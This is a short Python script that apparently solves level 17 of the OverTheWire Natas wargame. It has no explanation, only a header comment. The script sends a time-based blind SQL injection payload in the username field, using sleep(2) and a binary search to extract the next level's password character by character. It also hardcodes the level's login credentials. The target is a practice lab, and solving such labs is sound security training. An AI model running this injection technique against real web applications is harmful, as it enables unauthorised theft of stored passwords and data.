###########################################################
#
# Binary Key Search with Timing Attack
#
###########################################################

import urllib
import urllib2
import socket

alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
natas18_pass = []
i = 0

# create a password manager
def setupAuth():
	password_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
	top_level_url = "http://natas17.natas.labs.overthewire.org/"
	password_mgr.add_password(None, top_level_url, "natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")
	handler = urllib2.HTTPBasicAuthHandler(password_mgr)
	opener = urllib2.build_opener(handler)
	urllib2.install_opener(opener)

def isFound(idx, arr):
	data = urllib.urlencode({"username":"natas18\" AND IF(BINARY SUBSTRING(password, " + str(idx) + ", 1)" + \
							" BETWEEN \"" + arr[0] + "\" AND \"" + arr[len(arr)-1] + "\", sleep(2), 1) #"})
	# print "Trying: " + urllib.unquote(data).decode('utf8')
	try:
	 	u = urllib2.urlopen("http://natas17.natas.labs.overthewire.org/index.php", data, 1)
	except urllib2.URLError as urlerr:
		setupAuth()
		return isFound(idx, arr)
	except socket.timeout as sto:
		return True
	return False

def bsearch(idx, arr):
	ret = ''
	if len(arr) == 1:
		return arr[0]
	if isFound(idx, arr[0:len(arr)/2]):
		ret = bsearch(idx, arr[0:len(arr)/2])
	else:
		ret = bsearch(idx, arr[len(arr)/2:len(arr)])
	return ret

setupAuth()

for i in range(1,64):
		c = ''
		if isFound(i, list(alphabet)):
			c = bsearch(i, list(alphabet))

		if c != '':
			natas18_pass.append(c);
			print("Password: " + "".join(natas18_pass))
